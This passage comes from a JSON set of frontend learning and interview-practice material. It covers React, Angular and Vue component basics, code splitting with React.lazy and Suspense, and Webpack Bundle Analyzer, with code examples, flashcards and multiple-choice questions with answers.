          "solutionCode": "Based on the requirements, I would recommend **React** for this new, large-scale web application.\n\n**Justification for Choosing React:**\n\n1.  **Complexity & Interactivity (Data Visualization & Frequent Updates)**: React excels at building complex, interactive UIs that require frequent updates. Its component-based architecture and efficient Virtual DOM make it highly performant for scenarios like dynamic dashboards and data visualization, where granular UI updates are common.\n2.  **Flexibility and Third-Party Integration**: The project needs flexibility to integrate various third-party libraries (charting, complex forms). React, being a library, is highly unopinionated about solutions for routing, state management, or forms. This allows the team to pick best-of-breed libraries for each specific need (e.g., D3.js or Chart.js for data visualization, React Hook Form for complex forms, Zustand or Redux for state management), which is a significant advantage for a dashboard application.\n3.  **Rapid Prototyping**: With a strong JavaScript background, developers can quickly start building with React due to its component reusability and declarative nature. While the learning curve is moderate, the flexibility allows for quick iteration once core concepts are grasped.\n4.  **Mixed Experience Team (JavaScript Focus)**: While some developers are newer, the strong JavaScript background within the team is a good fit for React. While it uses JSX, it's still fundamentally JavaScript-centric, which minimizes the overhead of learning a new language like TypeScript (as required by Angular) for everyone.\n\n**Why Other Frameworks are Less Ideal for This Scenario:**\n\n*   **Angular**: While excellent for large-scale enterprise applications, Angular's highly opinionated nature and steep learning curve (especially with TypeScript and RxJS) might be a challenge for a smaller team with mixed experience that values rapid prototyping and flexibility. Its built-in solutions, while comprehensive, might also be overkill or too restrictive if the team prefers to choose specific libraries for granular control over features like data visualization, where external libraries are often superior to framework-native ones.\n*   **Vue.js**: Vue.js is a strong contender due to its gentle learning curve and progressive nature, making it appealing for teams with mixed experience. However, for a truly 'large-scale' and 'complex dashboard' application with highly specific third-party integration needs, React's larger and more mature ecosystem, especially in areas like data visualization and advanced UI libraries, might offer more robust and specialized solutions that can be easily plugged in due to React's flexibility. While Vue is flexible, its ecosystem, while growing rapidly, might not yet match React's breadth for every niche requirement in complex dashboarding.",
          "testCases": [
            "Ensure a single framework recommendation is made.",
            "Validate that the justification clearly links to *all* provided requirements (scale, team experience, interactivity, flexibility, third-party libraries).",
            "Verify that the reasons for not choosing the other two frameworks are logical and consistent with their known characteristics.",
            "Check for clarity, conciseness, and logical flow of argumentation."
          ],
          "hints": [
            "Consider the trade-offs between 'full framework' vs. 'library' vs. 'progressive framework' in relation to flexibility and opinionation.",
            "Think about how team size and experience influence the learning curve and ramp-up time for a new project.",
            "Relate the 'complex dashboard, data visualization, frequent UI updates' need to how each framework handles DOM manipulation and reactivity.",
            "Focus on the ecosystem and third-party library availability for specialized needs."
          ],
          "tags": [
            "Framework Selection",
            "Frontend Architecture",
            "Project Management",
            "Decision Making",
            "React",
            "Angular",
            "Vue.js"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "Comprehensive understanding of React, Angular, and Vue.js features and use cases"
          ],
          "complexity": 9,
          "interviewRelevance": 10,
          "learningPath": "expert",
          "relatedConcepts": [
            "Frontend Architecture",
            "Scalability",
            "Team Dynamics",
            "Ecosystem"
          ]
        }
      ]
    }
  },
  {
    "id": "335856c4-4f49-4c58-b3f1-c2aa7ce61f04",
    "startLine": 12200,
    "endLine": 12299,
    "processedDate": "2025-06-17T12:47:48.108Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_react_component_basics",
          "title": "React Functional Components and State Management with Hooks",
          "content": "React applications are built using components, which are independent, reusable pieces of UI. Functional components are JavaScript functions that accept props (properties) as input and return React elements describing what should appear on the screen.\n\n### `useState` Hook\n`useState` is a React Hook that lets you add state to functional components. Before Hooks, state was primarily managed in class components. `useState` returns an array with two elements:\n\n1.  **Current state value**: The current value of the state variable.\n2.  **Setter function**: A function that lets you update the state. When the setter function is called with a new state value, React re-renders the component.\n\n#### Basic Usage\n```typescript\nimport React, { useState } from 'react';\n\nfunction MyComponent() {\n  // Declares a state variable 'count' initialized to 0\n  // and a setter function 'setCount'\n  const [count, setCount] = useState(0);\n\n  // When 'setCount' is called, 'count' updates and the component re-renders.\n  const increment = () => setCount(count + 1);\n\n  return (\n    <div>\n      <p>Current Count: {count}</p>\n      <button onClick={increment}>Increment</button>\n    </div>\n  );\n}\n```\n\n### JSX (JavaScript XML)\nReact components use JSX, a syntax extension for JavaScript. JSX allows you to write HTML-like structures directly within your JavaScript code. It's not mandatory to use JSX, but it makes React code more readable and concise. JSX expressions are compiled down to `React.createElement()` calls.",
          "examples": [
            {
              "id": "example_react_counter_1",
              "title": "React Counter Component",
              "code": "import React, { useState } from 'react';\n\nfunction Counter() {\n  const [count, setCount] = useState(0);\n  \n  return (\n    <div>\n      <p>Count: {count}</p>\n      <button onClick={() => setCount(count + 1)}>Increment</button>\n    </div>\n  );\n}\n\nexport default Counter;",
              "explanation": "This example demonstrates a basic React functional component. `useState(0)` initializes `count` to 0. The button's `onClick` handler calls `setCount` to update the state, which triggers a re-render of the component, displaying the new `count` value.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_react_hooks_1",
            "question_react_mcq_1",
            "question_react_open_1",
            "question_react_flashcard_1"
          ],
          "relatedTasks": [
            "task_react_simple_counter"
          ],
          "tags": [
            "React",
            "Hooks",
            "useState",
            "Functional Components",
            "JSX",
            "State Management"
          ],
          "technology": "React",
          "prerequisites": [
            "JavaScript ES6",
            "HTML basics"
          ],
          "complexity": 5,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "React State Management",
            "React Hooks Deep Dive",
            "Building SPAs with React"
          ]
        },
        {
          "id": "theory_angular_component_basics",
          "title": "Angular Component Fundamentals",
          "content": "Angular applications are composed of NgModules, which provide a compilation context for components. Components are the fundamental building blocks of an Angular application, responsible for controlling a part of the screen (a view) through its template.\n\n### `@Component` Decorator\nComponents are defined using the `@Component` decorator, which attaches metadata to a TypeScript class, marking it as an Angular component. Key properties include:\n\n*   **`selector`**: A CSS selector that tells Angular to create and insert an instance of this component wherever it finds the corresponding tag in the HTML. (e.g., `app-counter` means use `<app-counter>`).\n*   **`template`** or **`templateUrl`**: Defines the component's view. `template` allows inline HTML, while `templateUrl` points to an external HTML file.\n*   **`styleUrls`**: An array of URLs pointing to CSS files to apply to this component's view. These styles are encapsulated by default.\n\n### Component Class and Data Binding\nAn Angular component is a plain TypeScript class. Properties declared in this class are accessible within the component's template. Angular uses two main types of data binding:\n\n*   **Interpolation `{{ }}`**: Displays a component property's value in the template. This is a one-way data binding from component to view.\n*   **Event Binding `( )`**: Binds a DOM event (like `click`, `submit`) to a method in the component class. When the event occurs, the method is executed. This is a one-way data binding from view to component.\n\n#### Basic Usage\n```typescript\nimport { Component } from '@angular/core';\n\n@Component({\n  selector: 'app-my-component',\n  template: `\n    <div>\n      <p>{{message}}</p>\n      <button (click)=\"changeMessage()\">Change</button>\n    </div>\n  `\n})\nexport class MyComponent {\n  message = 'Hello Angular!';\n\n  changeMessage() {\n    this.message = 'Message Changed!';\n  }\n}\n```",
          "examples": [
            {
              "id": "example_angular_counter_1",
              "title": "Angular Counter Component",
              "code": "import { Component } from '@angular/core';\n\n@Component({\n  selector: 'app-counter',\n  template: `\n    <div>\n      <p>Count: {{count}}</p>\n      <button (click)=\"increment()\">Increment</button>\n    </div>\n  `\n})\nexport class CounterComponent {\n  count = 0;\n  \n  increment() {\n    this.count++;\n  }\n}",
              "explanation": "This example shows an Angular component. The `@Component` decorator defines its selector (`app-counter`) and inline template. `{{count}}` uses interpolation to display the `count` property's value. `(click)=\"increment()\"` binds the button's click event to the `increment` method, which updates `this.count`.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_angular_mcq_1",
            "question_angular_open_1",
            "question_angular_flashcard_1",
            "question_angular_code_1"
          ],
          "relatedTasks": [
            "task_angular_data_binding"
          ],
          "tags": [
            "Angular",
            "Components",
            "Decorators",
            "Data Binding",
            "TypeScript"
          ],
          "technology": "Angular",
          "prerequisites": [
            "TypeScript basics",
            "HTML basics"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "Angular Architecture",
            "Angular Forms",
            "Angular Routing"
          ]
        },
        {
          "id": "theory_vue_component_basics",
          "title": "Vue Component Structure and Options API",
          "content": "Vue.js applications are composed of reusable components. A Vue component typically consists of three main blocks: `<template>`, `<script>`, and `<style>` (not shown in the example, but common).\n\n### Single File Components (SFCs)\nVue often uses Single File Components (SFCs) with a `.vue` extension. These files encapsulate the component's template, logic, and styles in a single, cohesive file.\n\n*   **`<template>`**: Contains the HTML structure of the component's view. It must have a single root element.\n*   **`<script>`**: Contains the component's JavaScript logic. When using the Options API (as in the example), `export default` is used to define the component's options.\n    *   **`data()`**: A function that returns an object containing the reactive data for the component. Each property in this object will become reactive, meaning Vue will track its changes and update the view accordingly.\n    *   **`methods`**: An object containing methods (functions) that can be called from the template (e.g., in response to user events).\n*   **`<style>` (Optional)**: Contains the CSS for the component. Can be scoped to prevent styles from leaking to other components.\n\n### Data Reactivity and Event Handling\nVue's reactivity system automatically tracks changes to data properties and efficiently updates the DOM. Event handling in Vue templates uses the `v-on` directive, often shortened to `@`. For example, `@click=\"methodName\"` binds a click event to a method defined in the `methods` option.\n\n#### Basic Usage\n```html\n<template>\n  <div>\n    <p>{{ message }}</p>\n    <button @click=\"changeMessage\">Change Message</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  data() {\n    return {\n      message: 'Hello Vue!'\n    };\n  },\n  methods: {\n    changeMessage() {\n      this.message = 'Message Changed!';\n    }\n  }\n};\n</script>\n```",
          "examples": [
            {
              "id": "example_vue_counter_1",
              "title": "Vue Counter Component",
              "code": "<template>\n  <div>\n    <p>Count: {{ count }}</p>\n    <button @click=\"increment\">Increment</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  data() {\n    return {\n      count: 0\n    };\n  },\n  methods: {\n    increment() {\n      this.count++;\n    }\n  }\n};\n</script>",
              "explanation": "This example showcases a Vue Single File Component. The `<template>` defines the view. In the `<script>` block, `data()` returns the reactive `count` property, initialized to 0. The `increment` method, defined in `methods`, updates `this.count`. The `@click` directive on the button calls this method.",
              "language": "html"
            }
          ],
          "relatedQuestions": [
            "question_vue_mcq_1",
            "question_vue_open_1",
            "question_vue_flashcard_1",
            "question_vue_code_1"
          ],
          "relatedTasks": [
            "task_vue_todo_list"
          ],
          "tags": [
            "Vue.js",
            "Components",
            "Options API",
            "Data Reactivity",
            "SFC",
            "Event Handling"
          ],
          "technology": "Vue.js",
          "prerequisites": [
            "JavaScript ES6",
            "HTML basics"
          ],
          "complexity": 5,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "Vue State Management (Vuex)",
            "Vue Routing",
            "Vue Composition API"
          ]
        },
        {
          "id": "theory_code_splitting_intro",
          "title": "Introduction to Code Splitting",
          "content": "Code splitting is a technique used in modern web development to break down a large JavaScript bundle into smaller, more manageable chunks. Instead of loading an entire application's code at once, code splitting allows for loading parts of the application on demand, improving performance.\n\n### Why Code Splitting?\n\n*   **Improved Initial Load Time**: Users only download the code necessary for the current view, reducing the initial load time of the application.\n*   **Reduced Bandwidth Usage**: Less data needs to be transferred over the network, which is particularly beneficial for users on slower connections or with limited data plans.\n*   **Better Resource Utilization**: Browsers can prioritize loading critical resources, leading to a faster 'time to interactive'.\n*   **Optimized Caching**: Smaller chunks can be cached independently. If only a small part of the application changes, only that chunk needs to be re-downloaded, rather than the entire bundle.\n\nCode splitting is typically achieved using dynamic imports, which allow you to load modules asynchronously. Build tools like Webpack, Rollup, and Parcel support code splitting out of the box.",
          "examples": [
            {
              "id": "example_code_splitting_before_after",
              "title": "Before and After Code Splitting (Conceptual)",
              "code": "// Before code splitting\nimport LargeComponent from './LargeComponent';\n\nfunction App() {\n  return <LargeComponent />;\n}\n\n// After code splitting (conceptual, framework-specific implementations vary)\n// The LargeComponent is only loaded when needed, e.g., when a route is activated.\nconst LargeComponent = () => import('./LargeComponent'); // Dynamic import\n\nfunction App() {\n  // Render LargeComponent only when it's accessed or its route is matched\n  return <SomeWrapperComponent renderOnDemand={LargeComponent} />;\n}",
              "explanation": "The 'Before' example shows a typical static import where `LargeComponent` is bundled with the main application. The 'After' example conceptually illustrates that `LargeComponent` is dynamically imported, meaning its code will be in a separate chunk and loaded only when requested, typically when a specific feature or route is accessed.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_codesplitting_open_1",
            "question_codesplitting_mcq_1",
            "question_codesplitting_flashcard_1"
          ],
          "relatedTasks": [
            "task_react_lazy_loading"
          ],
          "tags": [
            "Code Splitting",
            "Performance Optimization",
            "Webpack",
            "Bundling",
            "Dynamic Import"
          ],
          "technology": "Frontend Architecture",
          "prerequisites": [
            "JavaScript Modules",
            "Webpack basics"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "requiredFor": [
            "Web Performance Optimization",
            "Large Scale Application Architecture"
          ]
        },
        {
          "id": "theory_react_lazy_suspense",
          "title": "Code Splitting in React with `React.lazy` and `Suspense`",
          "content": "React provides built-in mechanisms for code splitting via `React.lazy` and `Suspense`, which work seamlessly with bundlers like Webpack.\n\n### `React.lazy()`\n`React.lazy()` is a function that lets you render a dynamic import as a regular component. It takes a function that returns a Promise, which resolves to a module with a default export containing a React component. The component code is loaded only when it's actually rendered.\n\n### `Suspense` Component\n`Suspense` is a React component that lets you \"wait\" for some code to load and declaratively specify a loading indicator (fallback) while that code is being loaded. It can wrap one or more `React.lazy` components.\n\n#### How it Works Together\nWhen a component loaded with `React.lazy` is rendered, and its code has not yet been loaded, the `Suspense` component renders its `fallback` prop (e.g., a loading spinner or text). Once the component's code is downloaded, `Suspense` renders the actual component.\n\n#### Important Considerations\n*   **SSR (Server-Side Rendering)**: `React.lazy` and `Suspense` are not fully supported for server-side rendering out of the box. Solutions like Loadable Components are often used for SSR with code splitting.\n*   **Error Boundaries**: It's good practice to wrap lazy-loaded components with an Error Boundary to catch any loading failures (e.g., network errors).\n\n#### Example Flow\n1.  Browser requests `App` component.\n2.  `App` renders `Suspense`.\n3.  Inside `Suspense`, `LargeComponent` (lazy-loaded) is encountered.\n4.  If `LargeComponent`'s chunk is not loaded, `Suspense` displays `fallback` (`<div>Loading...</div>`).\n5.  Webpack (or other bundler) initiates loading of `LargeComponent`'s chunk.\n6.  Once loaded, `LargeComponent` renders, and the `fallback` is hidden.",
          "examples": [
            {
              "id": "example_react_lazy_suspense_1",
              "title": "Implementing Code Splitting with React.lazy and Suspense",
              "code": "import React, { Suspense } from 'react';\n// Before code splitting\n// import LargeComponent from './LargeComponent';\n\n// function App() {\n//   return <LargeComponent />;\n// }\n\n// After code splitting with React.lazy\nconst LargeComponent = React.lazy(() => import('./LargeComponent'));\n\nfunction App() {\n  return (\n    <Suspense fallback={<div>Loading...</div>}>\n      <LargeComponent />\n    </Suspense>\n  );\n}",
              "explanation": "This example demonstrates how to use `React.lazy` and `Suspense`. `LargeComponent` is dynamically imported using `React.lazy`. The `Suspense` component wraps `LargeComponent` and displays 'Loading...' as a fallback until `LargeComponent`'s code chunk is downloaded and ready to render.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_react_lazy_mcq_1",
            "question_react_lazy_open_1",
            "question_react_lazy_flashcard_1",
            "question_react_lazy_code_1"
          ],
          "relatedTasks": [
            "task_react_lazy_loading"
          ],
          "tags": [
            "React",
            "Code Splitting",
            "React.lazy",
            "Suspense",
            "Performance Optimization",
            "Dynamic Import"
          ],
          "technology": "React",
          "prerequisites": [
            "React Components",
            "JavaScript Promises"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "requiredFor": [
            "Large Scale React Apps",
            "Optimizing React Performance"
          ]
        },
        {
          "id": "theory_webpack_bundle_analyzer",
          "title": "Webpack Bundle Analyzer for Performance Optimization",
          "content": "The Webpack Bundle Analyzer is a powerful tool that visualizes the contents of your Webpack output bundles in an interactive treemap. It helps developers understand what makes up the size of their bundles, identify large dependencies, and find opportunities for optimization.\n\n### How it Works\nIt creates an HTML file that contains a treemap visualization of your bundle. Each rectangle in the treemap represents a module (a file or a dependency) within your bundle. The size of the rectangle is proportional to the size of the module in the bundle.\n\n### Benefits\n*   **Identify Large Modules**: Quickly pinpoint which modules or third-party libraries are contributing most to your bundle size.\n*   **Detect Duplicates**: Discover if the same library is included multiple times due to different versions or conflicting dependencies.\n*   **Optimize Imports**: See if you are importing entire libraries when only a small part is needed (e.g., importing all of `lodash` instead of `lodash/get`).\n*   **Validate Code Splitting**: Verify that your code splitting strategies are effectively creating smaller chunks and not still including unnecessary code in initial bundles.\n\n### Usage\nIt's typically configured as a Webpack plugin. After running a Webpack build with the plugin enabled, it will generate an HTML report in your build output directory, which opens automatically in your browser.",
          "examples": [
            {
              "id": "example_webpack_bundle_analyzer_config",
              "title": "Webpack Bundle Analyzer Configuration",
              "code": "const BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin;\n\nmodule.exports = {\n  // ... other webpack configurations\n  plugins: [\n    new BundleAnalyzerPlugin({\n      analyzerMode: 'static', // Generates an HTML file with the report\n      reportFilename: 'bundle-report.html', // Name of the report file\n      openAnalyzer: false, // Don't open the report automatically in the browser\n      logLevel: 'info' // Suppress or show more info logs\n    })\n  ]\n};",
              "explanation": "This code snippet shows how to integrate `webpack-bundle-analyzer` into a Webpack configuration. The `BundleAnalyzerPlugin` is added to the `plugins` array. Setting `analyzerMode: 'static'` generates a standalone HTML report file, `reportFilename` specifies its name, and `openAnalyzer: false` prevents automatic opening.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_webpack_analyzer_open_1",
            "question_webpack_analyzer_mcq_1",
            "question_webpack_analyzer_flashcard_1"
          ],
          "relatedTasks": [
            "task_performance_optimization_analysis"
          ],
          "tags": [
            "Webpack",
            "Performance Optimization",
            "Bundling",
            "Tooling",
            "Developer Tools"
          ],
          "technology": "Webpack",
          "prerequisites": [
            "Webpack basics",
            "NPM/Yarn"
          ],
          "complexity": 6,
          "interviewRelevance": 7,
          "learningPath": "advanced",
          "requiredFor": [
            "Build Process Optimization",
            "Frontend Tooling",
            "Advanced Webpack Configuration"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_react_hooks_1",
          "topic": "React Hooks: `useState`",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of the `useState` hook in React functional components?",
          "answer": "`useState` allows functional components to manage and update their internal state, enabling re-renders when the state changes.",
          "options": [],
          "analysisPoints": [
            "Tests understanding of core React hooks.",
            "Focuses on the primary utility of `useState`.",
            "Distinguishes functional component capabilities."
          ],
          "keyConcepts": [
            "useState",
            "React Hooks",
            "Functional Components",
            "State Management",
            "Re-rendering"
          ],
          "evaluationCriteria": [
            "Accuracy in defining `useState`'s role.",
            "Conciseness of the explanation."
          ],
          "example": null,
          "tags": [
            "React",
            "Hooks",
            "useState",
            "Flashcard"
          ],
          "prerequisites": [
            "React basics"
          ],
          "complexity": 3,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_react_mcq_1",
          "topic": "React State Updates",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following React component:\n```typescript\nimport React, { useState } from 'react';\n\nfunction MyComponent() {\n  const [count, setCount] = useState(0);\n  \n  const handleClick = () => {\n    setCount(count + 1);\n    setCount(count + 1);\n  };\n  \n  return (\n    <div>\n      <p>Count: {count}</p>\n      <button onClick={handleClick}>Increment Twice</button>\n    </div>\n  );\n}\n```\nIf `count` is initially `0`, what will be the value of `count` displayed after clicking the 'Increment Twice' button once?",
          "answer": "1",
          "options": [
            "0",
            "1",
            "2",
            "undefined"
          ],
          "analysisPoints": [
            "Tests understanding of how React batches state updates.",
            "Highlights that `setCount` calls inside the same event handler might use a stale closure over the `count` variable.",
            "Explains the difference between synchronous and asynchronous updates."
          ],
          "keyConcepts": [
            "useState",
            "State Updates",
            "React Batching",
            "Closures"
          ],
          "evaluationCriteria": [
            "Correct understanding of React's update mechanism.",
            "Ability to identify potential pitfalls with `useState`."
          ],
          "example": "The correct answer is **1**. In React, `setCount` calls within the same event loop cycle (like a single `onClick` handler) are often batched for performance. When `handleClick` runs, both `setCount(count + 1)` calls see the `count` variable as its value *at the beginning of the `handleClick` function execution*. So, if `count` is `0`, both calls become `setCount(0 + 1)`, effectively `setCount(1)`. React then applies this `setCount(1)` operation once.",
          "tags": [
            "React",
            "Hooks",
            "useState",
            "MCQ",
            "State Management"
          ],
          "prerequisites": [
            "React Hooks",
            "JavaScript closures"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_open_1",
          "topic": "React State vs. Props",
          "level": "medium",
          "type": "open",
          "question": "Explain the difference between 'state' and 'props' in React components. When would you use one over the other?",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "**State**: Internal to a component, managed by the component itself (e.g., using `useState` or `this.state`). It is mutable and changes trigger re-renders. Used for data that can change over time within the component (e.g., form input values, loading status, counter value).",
            "**Props**: External data passed from a parent component to a child component. They are immutable (read-only) for the child component. Used for passing data down the component tree to configure or customize child components.",
            "**When to use**: Use state for data that changes *within* the component. Use props for data that is passed *into* the component from outside, or for configuration.",
            "**Relationship**: State changes in a parent can be passed as props to children, causing children to re-render."
          ],
          "keyConcepts": [
            "State",
            "Props",
            "React Components",
            "Data Flow",
            "Reactivity"
          ],
          "evaluationCriteria": [
            "Clear and accurate definitions of both concepts.",
            "Correct identification of mutability/immutability.",
            "Appropriate use cases for each.",
            "Understanding of data flow in React."
          ],
          "example": null,
          "tags": [
            "React",
            "State Management",
            "Props",
            "Open-Ended"
          ],
          "prerequisites": [
            "React Components"
          ],
          "complexity": 6,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_flashcard_1",
          "topic": "React Event Handling",
          "level": "easy",
          "type": "flashcard",
          "question": "How do you typically handle events (like `click`) on DOM elements in React JSX?",
          "answer": "You pass a function (event handler) as a prop to the DOM element using camelCase naming (e.g., `onClick`, `onChange`). The function will be executed when the event occurs.",
          "options": [],
          "analysisPoints": [
            "Focuses on basic event handling syntax.",
            "Highlights the camelCase convention in JSX."
          ],
          "keyConcepts": [
            "React Events",
            "JSX",
            "Event Handlers"
          ],
          "evaluationCriteria": [
            "Correctly identifies the syntax for event handling.",
            "Mentions passing a function as a prop."
          ],
          "example": null,
          "tags": [
            "React",
            "Events",
            "JSX",
            "Flashcard"
          ],
          "prerequisites": [
            "React JSX basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_angular_mcq_1",
          "topic": "Angular Component Decorator",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following is NOT a valid property that can be defined directly within the `@Component` decorator in Angular?",
          "answer": "NgModule",
          "options": [
            "selector",
            "template",
            "styleUrls",
            "NgModule"
          ],
          "analysisPoints": [
            "Tests knowledge of Angular component metadata.",
            "Identifies common properties of `@Component`.",
            "Distinguishes between component-level metadata and module-level organization (`NgModule`)."
          ],
          "keyConcepts": [
            "Angular Components",
            "@Component Decorator",
            "Metadata",
            "NgModule"
          ],
          "evaluationCriteria": [
            "Correctly identifies the invalid option.",
            "Demonstrates understanding of Angular component structure."
          ],
          "example": "The correct answer is **NgModule**. `selector`, `template`, and `styleUrls` are common properties used to configure an Angular component via its `@Component` decorator. `NgModule` is a separate Angular concept used to organize and compile parts of an application, not a property within a component's decorator itself.",
          "tags": [
            "Angular",
            "Components",
            "Decorators",
            "MCQ"
          ],
          "prerequisites": [
            "Angular basics"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_angular_open_1",
          "topic": "Angular Data Binding",
          "level": "medium",
          "type": "open",
          "question": "Describe the difference between interpolation (`{{ }}`) and event binding (`( )`) in Angular templates. Provide a simple use case for each.",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "**Interpolation (`{{ }}`)**: Used for one-way data binding from the component's TypeScript class to the template. It displays the value of a component property as text in the HTML. Example: `{{ userName }}` to display a user's name.",
            "**Event Binding (`( )`)**: Used for one-way data binding from the template (DOM event) to the component's TypeScript class. It executes a component method when a specific DOM event occurs. Example: `(click)=\"submitForm()\"` to call `submitForm` method on button click.",
            "Both facilitate communication but in opposite directions: interpolation pushes data *to* the view, event binding pulls actions *from* the view."
          ],
          "keyConcepts": [
            "Angular Data Binding",
            "Interpolation",
            "Event Binding",
            "One-way Data Flow"
          ],
          "evaluationCriteria": [
            "Accurate definitions for both types of binding.",
            "Clear distinction in data flow direction.",
            "Relevant and correct use cases provided."
          ],
          "example": null,
          "tags": [
            "Angular",
            "Data Binding",
            "Open-Ended"
          ],
          "prerequisites": [
            "Angular templates"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_angular_flashcard_1",
          "topic": "Angular Component Selector",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the purpose of the `selector` property in an Angular `@Component` decorator?",
          "answer": "The `selector` defines the CSS selector (e.g., `app-root`, `app-my-component`) that Angular uses to locate and instantiate the component in the HTML.",
          "options": [],
          "analysisPoints": [
            "Tests basic Angular component configuration.",
            "Focuses on how components are used in templates."
          ],
          "keyConcepts": [
            "Angular Component",
            "Selector",
            "@Component Decorator"
          ],
          "evaluationCriteria": [
            "Correctly identifies the role of the selector.",
            "Provides a clear example of its format."
          ],
          "example": null,
          "tags": [
            "Angular",
            "Components",
            "Flashcard"
          ],
          "prerequisites": [
            "Angular basics"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_angular_code_1",
          "topic": "Angular Component Logic",
          "level": "medium",
          "type": "code",
          "question": "Modify the `CounterComponent` to prevent the count from going below zero. If the user tries to decrement when count is 0, it should remain 0.",
          "answer": "```typescript\nimport { Component } from '@angular/core';\n\n@Component({\n  selector: 'app-counter',\n  template: `\n    <div>\n      <p>Count: {{count}}</p>\n      <button (click)=\"increment()\">Increment</button>\n      <button (click)=\"decrement()\">Decrement</button>\n    </div>\n  `\n})\nexport class CounterComponent {\n  count = 0;\n  \n  increment() {\n    this.count++;\n  }\n\n  decrement() {\n    if (this.count > 0) {\n      this.count--;\n    }\n  }\n}\n```",
          "options": [],
          "analysisPoints": [
            "Tests ability to add new methods to an Angular component.",
            "Evaluates conditional logic implementation within component methods.",
            "Requires adding a new button and event binding in the template."
          ],
          "keyConcepts": [
            "Angular Component Methods",
            "Conditional Logic",
            "Event Binding",
            "Template Syntax"
          ],
          "evaluationCriteria": [
            "Correct implementation of `decrement` method.",
            "Appropriate conditional check (`this.count > 0`).",
            "Proper addition of new button and event binding in template.",
            "No side effects beyond the requirement."
          ],
          "example": null,
          "tags": [
            "Angular",
            "Components",
            "Coding Challenge",
            "Logic"
          ],
          "prerequisites": [
            "Angular Component Basics",
            "TypeScript"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_vue_mcq_1",
          "topic": "Vue Component Data",
          "level": "medium",
          "type": "mcq",
          "question": "In a Vue Options API component, why is the `data` property typically defined as a function that returns an object, rather than just a plain object?\n\n```javascript\n// Option A\nexport default {\n  data: {\n    message: 'Hello'\n  },\n  // ...\n};\n\n// Option B\nexport default {\n  data() {\n    return {\n      message: 'Hello'\n    };\n  },\n  // ...\n};\n```\nWhich option is the correct and why?",
          "answer": "Option B is correct because it ensures that each component instance gets a fresh, independent copy of the data object, preventing unintended state sharing between instances.",
          "options": [
            "Option A is correct because it's simpler and more direct.",
            "Option B is correct because it makes the data reactive.",
            "Option A is correct because it's a newer syntax for data definition.",
            "Option B is correct because it ensures that each component instance gets a fresh, independent copy of the data object, preventing unintended state sharing between instances."
          ],
          "analysisPoints": [
            "Tests understanding of Vue's reactivity system and component instance isolation.",
            "Highlights a common JavaScript closure/reference issue for objects.",
            "Explains the importance of returning a new object for each instance."
          ],
          "keyConcepts": [
            "Vue Reactivity",
            "Data Function",
            "Component Instances",
            "State Isolation",
            "Options API"
          ],
          "evaluationCriteria": [
            "Correctly identifies Option B as the best practice.",
            "Provides the accurate reason related to instance data isolation."
          ],
          "example": "The correct answer is **Option B**. If `data` were a plain object (Option A), all instances of that component would share the *same* data object by reference. Changes made by one instance would affect all other instances. By defining `data` as a function that returns a *new* object, each component instance gets its own unique data object, ensuring proper state isolation.",
          "tags": [
            "Vue.js",
            "Components",
            "Data Reactivity",
            "MCQ",
            "Options API"
          ],
          "prerequisites": [
            "Vue basics"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_vue_open_1",
          "topic": "Vue Single File Components (SFCs)",
          "level": "medium",
          "type": "open",
          "question": "What are the main sections of a Vue Single File Component (SFC) and what is the primary purpose of each section?",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "**`<template>`**: Defines the component's HTML structure. It must contain a single root element. Purpose: Renders the component's UI.",
            "**`<script>`**: Contains the component's JavaScript logic (data, methods, computed properties, lifecycle hooks). Purpose: Manages component state, behavior, and reactivity.",
            "**`<style>` (Optional)**: Contains the component's CSS. Can be scoped to apply styles only to the current component. Purpose: Styles the component's UI, often with encapsulation."
          ],
          "keyConcepts": [
            "Vue SFC",
            "Template",
            "Script",
            "Style",
            "Component Structure",
            "Encapsulation"
          ],
          "evaluationCriteria": [
            "Correctly identifies all three main sections.",
            "Provides accurate and concise purpose for each section.",
            "Mentions optionality and scoping for `<style>`."
          ],
          "example": null,
          "tags": [
            "Vue.js",
            "SFC",
            "Component Structure",
            "Open-Ended"
          ],
          "prerequisites": [
            "Vue basics"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_vue_flashcard_1",
          "topic": "Vue Event Handling Syntax",
          "level": "easy",
